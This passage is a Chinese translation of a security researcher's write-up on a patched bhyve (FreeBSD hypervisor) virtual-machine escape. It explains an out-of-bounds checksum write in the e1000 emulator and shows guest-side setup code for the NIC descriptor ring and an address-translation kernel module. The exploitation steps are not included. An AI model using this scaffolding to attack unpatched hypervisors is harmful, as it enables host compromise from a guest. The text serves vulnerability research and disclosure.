---
title: DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞
url: https://buaq.net/go-164722.html
source: unSafe.sh - 不安全
date: 2023-05-21
fetch_date: 2025-10-04T11:37:02.730275
---

# DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/7fc55e5eacc6da6aca9d8c55c2ab680a.jpg)

DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞

文章目录：【二进制分析】DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞介绍环境E82545 仿真器 数据包传输NIC 网卡设置漏洞挖掘虚拟机逃逸
*2023-5-20 15:49:0
Author: [xz.aliyun.com(查看原文)](/jump-164722.htm)
阅读量:21
收藏*

---

文章目录：

* [【二进制分析】DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞](#二进制分析dhyve-逃逸freebsd系统的虚拟机逃逸漏洞)
  + [介绍](#介绍)
  + [环境](#环境)
  + [E82545 仿真器 数据包传输](#e82545-仿真器-数据包传输)
  + [NIC 网卡设置](#nic-网卡设置)
  + [漏洞挖掘](#漏洞挖掘)
  + [虚拟机逃逸](#虚拟机逃逸)
    - [内存泄漏](#内存泄漏)
    - [代码执行](#代码执行)
  + [CAPSICUM 沙盒](#capsicum-沙盒)

原文链接：<https://www.synacktiv.com/en/publications/escaping-from-bhyve>

> Bhyve是FreeBSD的一种虚拟化程序。本篇文章描述了如何将适配器模拟器中的限制OOB写入漏洞转化为代码执行漏洞，从而实现逃离虚拟机的目的。介绍如下：

## 介绍

早在2017年，我曾在Phrack杂志上发表过一篇关于Qemu中的虚拟机逃逸的文章。漏洞存在于两个网卡的设备模拟器中：RTL8139和PCNET。在Reno Robert在同一期的Phrack杂志上发表了有关bhyve中几个虚拟机逃脱的论文之后，我决定审计可用的网络设备仿真器的代码。

AMD PCNET仿真器中的错误与插入分配缓冲区限制之外的校验和有关。我在PCI E82545仿真器中发现了类似的漏洞，位于UDP数据包校验和被插入到受控索引处。接下来，我将介绍如何将两个字节的基于堆栈的溢出转化为代码执行。

## 环境

由于我没有在计算机上安装FreeBSD，因此我需要启用嵌套虚拟化的QEMU/KVM虚拟机中运行bhyve hypervisor。主机机器正在运行FreeBSD 13.0-RELEASE releng/13.0。客户端虚拟机也是一个由vm-bhyve管理的FreeBSD，其配置如下：

```
[email protected]:~ # vm configure freebsd
loader="bhyveload"
cpu=1
memory=2048M
network0_type="e1000"
network0_switch="target"
network0_mac="58:9c:fc:0f:b4:44"
network1_type="virtio-net"
network1_switch="ssh"
network1_mac="58:9c:fc:04:49:ac"
disk0_type="virtio-blk"
disk0_name="disk0.img"
```

## E82545 仿真器 数据包传输

函数e82545\_transmit(pci\_e82545.c)负责传输数据包。该函数遍历数据包描述符的环形缓冲区，并填充一个iovec结构的缓冲区：

有三种类型的数据包描述符：

* E1000\_TXD\_TYP\_C：这种类型是上下文描述符。相关的数据结构（e1000\_context\_desc）编码，包含了标头和有效载荷长度以及IP和TCP校验和偏移量等信息。
* E1000\_TXD\_TYP\_D：这个类型是数据描述符。相关的数据结构（e1000\_data\_desc）保存数据缓冲区物理地址的指针。
* E1000\_TXD\_TYP\_L：这个类型是传统的数据描述符。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230520154731-9381cb42-f6e2-1.png)

数据包通过调用e82545\_transmit\_backend提交，最终会调用以下函数：

## NIC 网卡设置

为了触发我们的漏洞，我们首先需要设置网卡。e1000网络适配器有几个寄存器可以通过`in*()`和`out*()`原语（来自machine/cpufunc.h）进行配置。这里需要注意，这些函数在Linux头文件sys/io.h中的默认配置与FreeBSD中不同，所以在弄清楚参数端口和数据在FreeBSD中交换之前，我遇到了一些错误配置。

这里需要的是配置TX描述符的环形缓冲区：

```
tx_size = tx_nb * sizeof(union e1000_tx_udesc);
tx_ring = aligned_alloc(PAGE_SIZE, tx_size);
memset(tx_ring, 0, tx_size);

for(int i = 0; i < tx_nb; i++) {
    buffer = aligned_alloc(PAGE_SIZE, BUFF_SIZE);
    memcpy(buffer, packet, sizeof(packet));

    tx_buffer[i] = buffer;
    addr = gva_to_gpa(buffer);
    warnx("TX ring buffer at 0x%"PRIx64"\n", addr);
    tx_ring[i].dd.buffer_addr = addr;
};
```

对于每个TX描述符，我们都需要提供保存要传输数据的缓冲区的物理地址。但是我没有在用户空间找到任何暴露的接口（例如/proc中没有pagemap）将虚拟地址转换为物理地址。所以，我自己编写了一个小型内核模块（`pt.ko`），用于执行这种转换：

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/sysproto.h>
#include <sys/systm.h>

#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>

struct pt_args
{
    vm_offset_t vaddr;
    uint64_t    *res;
};

static int pt(struct thread *td, void *args)
{
    struct pmap *pmap;
    struct pt_args *user = args;

    vm_offset_t vaddr = user->vaddr;
    uint64_t *res = user->res;

    uint64_t paddr;

    pmap = &td->td_proc->p_vmspace->vm_pmap;
    paddr = pmap_extract(pmap, vaddr);

    return copyout(&paddr, res, sizeof(uint64_t));
}

static struct sysent pt_sysent = {
   .sy_narg = 2,
   .sy_call = pt
};

static int offset=NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg)
{
    int error=0;
    switch(cmd) {
        case MOD_LOAD:
            uprintf("loading syscall at offset %d\n", offset);
            break;
        case MOD_UNLOAD:
            uprintf("unloading syscall from offset %d\n", offset);
            break;
        default:
            error=EOPNOTSUPP;
            break;
    }
    return error;
}

SYSCALL_MODULE(pt, &offset, &pt_sysent, load, NULL);
```

最后一步就是更新适配器中的描述符表地址了：

```
warnx("disable TX");
e1000_tx_disable();

addr = gva_to_gpa(tx_ring);

warnx("update TX desc table");
e1000_write_reg(TDBAL, (uint32_t)addr);  /* desc table addr, low bits */
e1000_write_reg(TDBAH, addr >> 32);      /* desc table addr, hi 32-bits */
e1000_write_reg(TDLEN, tx_size);         /* # descriptors in bytes */
e1000_write_reg(TDH, 0);                 /*desc table head idx */

warnx("enable TX");
e1000_tx_enable();
```

## 漏洞挖掘

漏洞存在于`e82545_transmit`函数中。就像以下代码片段所示，如果启用了TCP分段卸载（例如tso == 1），则从数据包上下文描述符中检索数据包头的长度（`hdrlen`）。

代码确保长度值不超过240字节的最大大小，并检查长度是否足够插入VLAN标记、IP和TCP校验和。

但是在非TCP数据包（例如UDP数据包）的情况下，没有对校验和偏移量（`ckinfo[1].ck_off`）进行检查。

[1]处缺失的检查导致[3]处和[4]处中的OOB读取和写入。该漏洞允许攻击者在[2]处分配给超过堆栈的限制的数据包头，来编写受控数据（计算的校验和）。

```
e82545_transmit(struct e82545_softc *sc, uint16_t head, uint16_t tail,
    uint16_t dsize, uint16_t *rhead, int *tdwb)
{

    /* ... */

    /* Simple non-TSO case. */
    if (!tso) {
        /* ... */
    } else {
        /* In case of TSO header length provided by software. */
        hdrlen = sc->esc_txctx.tcp_seg_setup.fields.hdr_len;

        if (hdrlen > 240) {
            WPRINTF("TSO hdrlen too large: %d", hdrlen);
            goto done;
        }

        if (vlen != 0 && hdrlen < ETHER_ADDR_LEN*2) {
            WPRINTF("TSO hdrlen too small for vlan insertion "
                "(%d vs %d) -- dropped", hdrlen,
                ETHER_ADDR_LEN*2);
            goto done;
        }

        if (hdrlen < ckinfo[0].ck_start + 6 ||
            hdrlen < ckinfo[0].ck_off + 2) {
            WPRINTF("TSO hdrlen too small for IP fields (%d) "
                "-- dropped", hdrlen);
            goto done;
        }

        if (sc->esc_txctx.cmd_and_length & E1000_TXD_CMD_TCP) {
            if (hdrlen < ckinfo[1].ck_start + 14 ||
                (ckinfo[1].ck_valid &&
                hdrlen < ckinfo[1].ck_off + 2)) {
                WPRINTF("TSO hdrlen too small for TCP fields "
                    "(%d) -- dropped", hdrlen);
                goto done;
            }
        } else {
            if (hdrlen < ckinfo[1].ck_start + 8) {
                WPRINTF("TSO hdrlen too small for UDP fields "
                    "(%d) -- dropped", hdrlen);
                // [1] Missing check on ckinfo[1].ck_off
                goto done;
            }
        }
    }

    /* Allocate, fill and prepend writable header vector. */
    if (hdrlen != 0) {
        // [2] Allocation of vulnerable buffer
        hdr = __builtin_alloca(hdrlen + vlen);
        /* ...*/
    }

    /* ... */

    /* Doing TSO. */

    if (ckinfo[1].ck_valid) /* Save partial pseudo-header checksum. */
        tcpcs = *(uint16_t *)&hdr[ckinfo[1].ck_off]; // [3] OOB Read

    /* ... */

    pv = 1;
    pvoff = 0;
    for (seg = 0, left = paylen; left > 0; seg++, left -= now) {

        /* ... */

        /* Calculate checksums and transmit. */
        if (ckinfo[0].ck_valid) {
            *(uint16_t *)&hdr[ckinfo[0].ck_off] = ipcs;
            e82545_transmit_checksum(tiov, tiovcnt, &ckinfo[0]);
        }
        if (ckinfo[1].ck_valid) {
            *(uint16_t *)&hdr[ckinfo[1].ck_off] =
                e82545_carry(tcpsum); // [4] OOB Write
            e82545_transmit_checksum(tiov, tiovcnt, &ckinfo[1]);
        }
        e82545_transmit_backend(sc, tiov, tiovcnt);
    }

    /* ... */
}
```

该漏洞于2022年3月7日向FreeBSD安全团队进行了报告。一个安全通告[https://www.freebsd.org/security/advisories/FreeBSD-SA-22:05.bhyve.asc在初始报告后一个月发布。在披露这个漏洞之后，我注意到Reno](https://www.freebsd.org/security/advisories/FreeBSD-SA-22%3A05.bhyve.asc%E5%9C%A8%E5%88%9D%E5%A7%8B%E6%8A%A5%E5%91%8A%E5%90%8E%E4%B8%80%E4%B8%AA%E6%9C%88%E5%8F%91%E5%B8%83%E3%80%82%E5%9C%A8%E6%8A%AB%E9%9C%B2%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E6%88%91%E6%B3%A8%E6%84%8F%E5%88%B0Reno) Robert在2019年报告了类似...